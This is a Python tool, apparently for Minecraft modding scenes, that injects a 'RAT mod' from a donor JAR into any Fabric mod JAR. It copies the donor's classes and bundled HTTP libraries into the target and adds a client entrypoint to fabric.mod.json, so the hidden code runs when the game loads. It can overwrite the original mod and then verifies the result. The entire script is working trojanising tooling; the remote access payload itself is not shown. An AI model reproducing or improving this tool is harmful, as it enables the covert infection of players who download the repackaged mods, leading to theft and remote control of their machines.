#!/usr/bin/env python3
"""Inject the RAT mod into any Fabric mod JAR. Drag a .jar onto this script!"""

from __future__ import annotations

import argparse
import json
import shutil
import sys
import tempfile
import zipfile
from pathlib import Path


SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_DONOR = SCRIPT_DIR / "donor.jar"

DONOR_CLASSES = {"template/EntryPoint.class", "META-INF/template.kotlin_module"}
DONOR_JAR_PREFIX = "META-INF/jars/"
DONOR_ENTRYPOINT_KEY = "client"
DONOR_ENTRYPOINT_CLASS = "template.EntryPoint"

DONOR_DEPENDENCIES = {"fabric-language-kotlin": ">=1.10.20+kotlin.1.9.24"}
DONOR_JARS = [
    {"file": "META-INF/jars/commons-logging-1.2.jar"},
    {"file": "META-INF/jars/httpclient-4.5.13.jar"},
    {"file": "META-INF/jars/httpcore-4.4.13.jar"},
]


def warn(msg: str) -> None:
    print(f"WARN: {msg}", file=sys.stderr)


def inject_rat(target_jar: Path, output_jar: Path, donor_jar: Path, overwrite: bool, backup: bool) -> list[str]:
    if output_jar.exists() and not overwrite:
        raise SystemExit(f"output already exists: {output_jar}")

    if not donor_jar.exists():
        raise SystemExit(f"donor JAR not found: {donor_jar}")

    output_jar.parent.mkdir(parents=True, exist_ok=True)

    with zipfile.ZipFile(donor_jar, "r") as donor, zipfile.ZipFile(target_jar, "r") as target:
        donor_names = set(donor.namelist())

        to_copy = set()
        for c in DONOR_CLASSES:
            if c not in donor_names:
                warn(f"donor missing expected entry: {c}")
            else:
                to_copy.add(c)

        jar_entries = [n for n in donor_names if n.startswith(DONOR_JAR_PREFIX)]
        if not jar_entries:
            warn("donor has no entries under META-INF/jars/")
        to_copy.update(jar_entries)

        fabric_json = json.loads(target.read("fabric.mod.json").decode("utf-8"))

        entrypoints = fabric_json.setdefault("entrypoints", {})
        client_ep = entrypoints.setdefault("client", [])
        if isinstance(client_ep, str):
            client_ep = [client_ep]
            entrypoints["client"] = client_ep
        new_entry = {"adapter": "kotlin", "value": DONOR_ENTRYPOINT_CLASS}
        if new_entry not in client_ep:
            if DONOR_ENTRYPOINT_CLASS in client_ep:
                warn(f"target already has entrypoint {DONOR_ENTRYPOINT_CLASS} (plain), replacing with kotlin adapter")
                client_ep[:] = [new_entry if v == DONOR_ENTRYPOINT_CLASS else v for v in client_ep]
            else:
                client_ep.append(new_entry)

        existing_jars = fabric_json.setdefault("jars", [])
        existing_jars_set = {json.dumps(j, sort_keys=True) for j in existing_jars if isinstance(j, dict)}
        for j in DONOR_JARS:
            key = json.dumps(j, sort_keys=True)
            if key not in existing_jars_set:
                existing_jars.append(j)
                existing_jars_set.add(key)

        depends = fabric_json.setdefault("depends", {})
        for dep, ver in DONOR_DEPENDENCIES.items():
            existing = depends.get(dep)
            if existing is None:
                depends[dep] = ver
            elif existing != ver:
                warn(f"target already depends on {dep} ({existing}), keeping as-is")

        with tempfile.NamedTemporaryFile(delete=False, suffix=".jar") as tmp:
            tmp_path = Path(tmp.name)

        try:
            with zipfile.ZipFile(tmp_path, "w", compression=zipfile.ZIP_DEFLATED) as out:
                skipped = set(to_copy)
                skipped.add("fabric.mod.json")

                for item in target.infolist():
                    if item.filename in skipped:
                        continue
                    out.writestr(item, target.read(item.filename))

                out.writestr(
                    "fabric.mod.json",
                    json.dumps(fabric_json, indent=2, ensure_ascii=False).encode("utf-8"),
                )

                for name in sorted(to_copy):
                    out.writestr(name, donor.read(name))

            if backup:
                bak = target_jar.with_suffix(target_jar.suffix + ".bak")
                idx = 1
                while bak.exists():
                    bak = target_jar.with_suffix(target_jar.suffix + f".bak{idx}")
                    idx += 1
                shutil.copy2(target_jar, bak)
                print(f"Backed up target -> {bak}")

            shutil.move(str(tmp_path), output_jar)
        finally:
            if tmp_path.exists():
                tmp_path.unlink()

    return sorted(to_copy)


def verify(output_jar: Path) -> list[str]:
    lines = []
    with zipfile.ZipFile(output_jar, "r") as jar:
        names = set(jar.namelist())
        data = json.loads(jar.read("fabric.mod.json").decode("utf-8"))

        lines.append(f"  template/EntryPoint.class present: {'template/EntryPoint.class' in names}")
        lines.append(f"  kotlin_module present: {'META-INF/template.kotlin_module' in names}")
        has_jars = any(n.startswith("META-INF/jars/") for n in names)
        lines.append(f"  embedded JARs present: {has_jars}")

        client_ep = data.get("entrypoints", {}).get("client", [])
        if isinstance(client_ep, str):
            client_ep = [client_ep]
        ep_match = [e for e in client_ep if isinstance(e, dict) and e.get("value") == DONOR_ENTRYPOINT_CLASS]
        lines.append(f"  entrypoint client.{DONOR_ENTRYPOINT_CLASS}: {len(ep_match) > 0}")

        jars_field = data.get("jars", [])
        lines.append(f"  jars entries: {len(jars_field)}")

        deps = data.get("depends", {})
        for d in DONOR_DEPENDENCIES:
            lines.append(f"  dependency {d}: {deps.get(d, 'MISSING')}")

    return lines


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Inject RAT mod into a Fabric mod JAR.")
    parser.add_argument("target", type=Path, nargs="?", help="Target Fabric mod JAR to inject into")
    parser.add_argument("--output", "-o", type=Path, default=None, help="Output path (default: overwrite target)")
    parser.add_argument("--donor", type=Path, default=DEFAULT_DONOR, help=f"RAT mod JAR (default: {DEFAULT_DONOR})")
    parser.add_argument("--yes", "-y", action="store_true", help="Skip confirmation prompt")
    parser.add_argument("--backup", action="store_true", help="Backup target before overwriting")
    parser.add_argument("--no-verify", action="store_true", help="Skip verification after injection")
    return parser.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    if args.target is None:
        print("Usage: inject_rat.py <target.jar> [--output injected.jar] [--backup] [-y]")
        print("   or: drag a .jar file onto inject_rat.bat")
        return 1

    target = args.target.resolve()
    if not target.exists():
        raise SystemExit(f"target JAR not found: {target}")

    output = args.output.resolve() if args.output else target
    overwrite = output.exists()
    if output == target:
        overwrite = True

    if overwrite and not args.yes:
        ans = input(f"Overwrite {output}? [y/N] ").strip().lower()
        if ans != "y":
            print("Aborted.")
            return 1

    donor = args.donor.resolve()
    injected = inject_rat(target, output, donor, overwrite=True, backup=args.backup)

    print(f"\nWrote {output}")
    print("Injected:")
    for e in injected:
        print(f"  {e}")
    print(f"Patched fabric.mod.json entrypoints.client -> {DONOR_ENTRYPOINT_CLASS} (kotlin adapter)")

    if not args.no_verify:
        print("\nVerification:")
        for line in verify(output):
            print(line)

    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
